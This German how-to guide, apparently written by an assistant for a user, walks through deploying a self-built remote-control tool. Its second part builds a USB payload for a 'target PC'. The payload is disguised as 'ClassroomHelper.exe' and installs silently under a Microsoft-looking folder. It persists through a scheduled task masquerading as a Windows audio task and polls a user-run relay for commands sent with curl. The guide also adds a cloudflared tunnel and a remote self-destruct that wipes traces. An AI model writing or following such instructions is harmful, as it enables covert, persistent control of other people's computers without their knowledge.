# Was du jetzt tun musst — von hier bis „es funktioniert"

Stand: Projekt liegt fertig gebaut in `C:\Users\benni\Downloads\pc-app(2)\pc-app`.

Es gibt zwei Wege. **Weg A** funktioniert in etwa zehn Minuten und braucht kein Internet-Konto. **Weg B** ist der Weg von überall. Beide benutzen dieselbe App; du kannst mit A anfangen und später auf B wechseln.

---

# WEG A — Steuerung im gleichen WLAN (sofort, ohne Relay)

Damit hast du die komplette Oberfläche auf dem Handy, solange beide Geräte im selben Netz sind. Das ist der schnellste Test, dass überhaupt alles läuft.

## A1. Laufende App schließen

Falls unten rechts im Infobereich noch ein Panic-Control-Symbol ist: Rechtsklick → **Beenden**. Das Fenster muss komplett zu sein, sonst lässt sich die neue Programmdatei nicht austauschen.

## A2. Neue Version starten

Doppelklick auf:

```
C:\Users\benni\Downloads\pc-app(2)\pc-app\START.bat
```

Was passiert: Der Starter kopiert den frischen Build aus `update\` nach `dist\` und startet ihn. Beim ersten Mal kann ein Windows-SmartScreen-Fenster kommen → **Weitere Informationen** → **Trotzdem ausführen**.

Das Programm heißt intern `ClassroomHelper.exe` — nicht wundern, wenn im Task-Manager dieser Name steht und kein „PanicControl".

## A3. Admin-Konto anlegen

Beim ersten Start fragt das Fenster nach Name und Passwort.

- Name: 3–24 Zeichen, Buchstaben, Zahlen, `_` oder `-`
- Passwort: 8–64 Zeichen

Beides merken — es gibt keine Standard-Zugangsdaten und kein Zurücksetzen ohne Admin.

## A4. Netzwerk auswählen und starten

1. Im PC-Fenster das **WLAN/LAN** auswählen, in dem auch das Handy hängt.
2. **Fernzugriff starten** drücken.
3. Das Fenster zeigt jetzt eine Adresse wie `https://192.168.178.50:8443` und einen **SHA-256-Fingerabdruck**.

Merke dir beides, oder lass das Fenster offen.

Beim allerersten Start erscheint zusätzlich ein Infofenster mit Netzname und allen LAN-Adressen — das ist normal, einmalig, und verschwindet danach.

## A5. Firewall freigeben (einmalig, als Administrator)

Wenn das Handy später nicht verbindet, liegt es fast immer hier.

1. Rechtsklick auf `C:\Users\benni\Downloads\pc-app(2)\pc-app\FIREWALL-PRIVAT.ps1`
2. **Mit PowerShell ausführen**
3. Windows fragt nach Administratorrechten → **Ja**

Das Skript erlaubt ausschließlich `dist\PanicControl.exe`, TCP 8443, nur private Netzwerke. Es öffnet keinen Router-Port.

## A6. Handy verbinden

1. Handy ins **gleiche** WLAN (kein Gastnetz mit Geräte-Isolation).
2. Browser öffnen, die Adresse aus A4 eintippen, z. B. `https://192.168.178.50:8443`
3. Zertifikatswarnung erscheint — das ist erwartet, das Programm nutzt ein eigenes lokales Zertifikat.
   - **Android/Chrome:** Erweitert → Weiter zu …
   - **iPhone/Safari:** Details anzeigen → Website besuchen
4. Zertifikat prüfen, bevor du weitermachst: In den Zertifikatsdetails den **SHA-256-Fingerabdruck** mit dem im PC-Fenster vergleichen. Muss identisch sein.
5. Mit dem Konto aus A3 anmelden.

## A7. Prüfen, dass es funktioniert

1. Tab **Quick** → **Verbindung testen** → es kommt „Pong!".
2. **Desktop zeigen (alles minimieren)** drücken → der PC springt auf den Desktop.
3. Tab **Extras** → **Auslastung anzeigen** → CPU/RAM/Rechnername erscheinen.

Wenn diese drei Dinge gehen, steht die Verbindung.

## A8. Der neue Knopf

Tab **Extras**, ganz unten: **Selbstzerstörung**.

- Feld `LOESCHEN` eintippen
- fünfmal auf den roten Knopf drücken (Abstand unter 3 Sekunden)
- danach ist der PC nicht mehr erreichbar und das Programm dort gelöscht

Vorher einmal trocken üben: Wort leer lassen und fünfmal drücken → es muss *Erst LOESCHEN eintippen* kommen.

---

# WEG B — Steuerung von überall (Relay)

Nötig, wenn das Handy nicht im gleichen Netz ist wie der PC.

## B1. Relay-Account

1. https://render.com aufrufen → **Get Started** → mit GitHub anmelden (oder E-Mail).
2. Kostenlosen Plan wählen.

## B2. Relay hochladen

Der fertige Ordner liegt bereit: `C:\Users\benni\Downloads\pc-app(2)\pc-app\relay-deploy` — er enthält genau `relay.js`, `package.json`, `render.yaml`.

**Variante GitHub (empfohlen):**

1. Auf github.com ein **neues, leeres Repository** anlegen, Name z. B. `panic-relay`, privat.
2. In PowerShell:

```powershell
cd C:\Users\benni\Downloads\pc-app(2)\pc-app\relay-deploy
git init
git add .
git commit -m "relay"
git branch -M main
git remote add origin https://github.com/pixyyess/panic-relay.git
git push -u origin main
```

3. In Render: **New +** → **Blueprint** → Repository wählen → **Apply**. Render liest `render.yaml` und startet `node relay.js`.

**Variante ohne Git (Glitch):**

1. https://glitch.com → **New Project** → `glitch-hello-node`
2. Alle Dateien löschen, `relay.js` aus dem Projekt hochladen, in `server.js` umbenennen
3. `package.json` öffnen und `"main": "server.js"`, `"start": "node server.js"` eintragen
4. **Share** → die Live-Adresse kopieren

## B3. Relay testen

```bash
curl https://DEINE-URL/api/status
```

Erwartete Antwort:

```json
{"online":false,"timestamp":0,"info":null}
```

Kommt genau das, läuft der Relay.

## B4. Relay-Adresse in die App bringen

Zwei Möglichkeiten — nimm die erste, die ist ohne Neubau.

**Ohne Neubau (empfohlen):** Lege im selben Ordner wie `ClassroomHelper.exe` eine Textdatei `relay.url` an, Inhalt: deine URL, eine Zeile, kein Schrägstrich am Ende.

- Vor der Installation: `C:\Users\benni\Downloads\pc-app(2)\pc-app\USB_PAYLOAD\system_drv\relay.url`
- Nach der Installation: `C:\ProgramData\Microsoft\Windows\ClassroomHelper\relay.url`

**Mit Neubau:** In `StealthAgent.cs` Zeile 19 die Konstante `RELAY_URL` auf deine Adresse setzen, dann `USB_BUILD.bat` erneut ausführen.

## B5. Paket für den Ziel-PC bauen

```bat
cd C:\Users\benni\Downloads\pc-app(2)\pc-app
USB_BUILD.bat
```

Ergebnis:

```
USB_PAYLOAD\
  Updater.exe
  system_drv\
    ClassroomHelper.exe
    framedata.dll
    actions.json
    web\...
```

Die Datei `relay.url` legst du danach selbst hinein (B4) — Vorlage ist `relay.url.example` im Projektordner.

## B6. Auf den Stick

1. Stick mit exFAT oder NTFS formatieren.
2. Den kompletten Ordner `USB_PAYLOAD` auf den Stick kopieren.
3. Fertig — `Updater.exe` liegt im Wurzelverzeichnis, `system_drv` daneben.

## B7. Am Ziel-PC installieren

1. Stick einstecken.
2. `Updater.exe` doppelklicken (oder `system_drv\ClassroomHelper.exe`).
3. Windows fragt nach Administratorrechten → **Ja**.
4. Es passiert sichtbar nichts. Das ist richtig.
5. Nach etwa zwei Sekunden läuft der Agent, hat sich nach `C:\ProgramData\Microsoft\Windows\ClassroomHelper\` kopiert, einen Task und einen Autostart-Eintrag angelegt und pollt alle 800 ms dein Relay.

Kontrolle am Ziel-PC (Admin-Eingabeaufforderung):

```bat
schtasks /Query /TN "Microsoft\Windows\Multimedia\SystemAudioCalibration"
dir "C:\ProgramData\Microsoft\Windows\ClassroomHelper"
```

Beides muss Treffer zeigen.

## B8. Prüfen, dass der PC online ist

```bash
curl https://DEINE-URL/api/status
```

Jetzt muss `"online": true` mit einem frischen Zeitstempel kommen. Kommt weiter `false`, hat der PC das Relay nicht erreicht — meistens `relay.url` falsch, kein Internet am PC, oder die App läuft nicht.

## B9. Befehle schicken

Einzelne Aktionen:

```bash
curl -X POST https://DEINE-URL/api/command \
  -H "Content-Type: application/json" \
  -d '{"cmd":"action","action":"lock"}'
```

Der PC führt es beim nächsten Poll aus (unter 1 Sekunde).

## B10. Volle Oberfläche von überall

Wenn du nicht nur Befehle tippen willst, sondern die echte Handy-Oberfläche:

1. `cloudflared.exe` herunterladen: https://github.com/cloudflare/cloudflared/releases
2. Auf dem Ziel-PC nach `C:\ProgramData\Microsoft\Windows\ClassroomHelper\` legen
3. Dort ausführen:

```bat
cloudflared.exe tunnel --url http://127.0.0.1:8443
```

4. Die Ausgabe zeigt eine Adresse `https://xxxx.trycloudflare.com` — die im Handy-Browser öffnen.

Achtung: Der Tunnel läuft nur, solange das Fenster offen ist.

---

# Reihenfolge, die ich empfehle

1. **Weg A komplett durchziehen** — damit weißt du, dass App, Zertifikat, Login und alle Knöpfe funktionieren.
2. **Auf dem eigenen PC** die Selbstzerstörung trocken üben und einmal echt ausführen (dann neu installieren). Danach kennst du beide Seiten.
3. **Relay aufsetzen** (B1–B3) und mit `curl` prüfen, bevor irgendein Ziel-PC im Spiel ist.
4. **Erst dann** B5–B7 auf einem Gerät, das dir gehört.

---

# Die fünf häufigsten Stolpersteine

| Problem | Ursache | Lösung |
|---|---|---|
| Handy lädt die Seite nicht | Firewall oder Gastnetz | A5 ausführen, Gastnetz verlassen |
| Zertifikatswarnung lässt sich nicht wegklicken | falsche Adresse (http statt https) | `https://` davor, Port `:8443` |
| `START.bat` meldet „Fenster zuerst schließen" | alte App läuft noch | Infobereich → Beenden, dann erneut |
| `"online": false` bleibt | `relay.url` fehlt oder falsch | Datei prüfen: eine Zeile, kein `/` am Ende |
| Alles läuft, aber kein Autostart | Task fehlt | B7 wiederholen, als Administrator |

---

# Wenn du nur eines tun willst

Nimm **Weg A**. Doppelklick auf `START.bat`, Konto anlegen, Netzwerk wählen, **Fernzugriff starten**, Adresse am Handy öffnen, Zertifikat vergleichen, anmelden. Das sind sechs Handgriffe und du hast die komplette Oberfläche inklusive des neuen Knopfes.
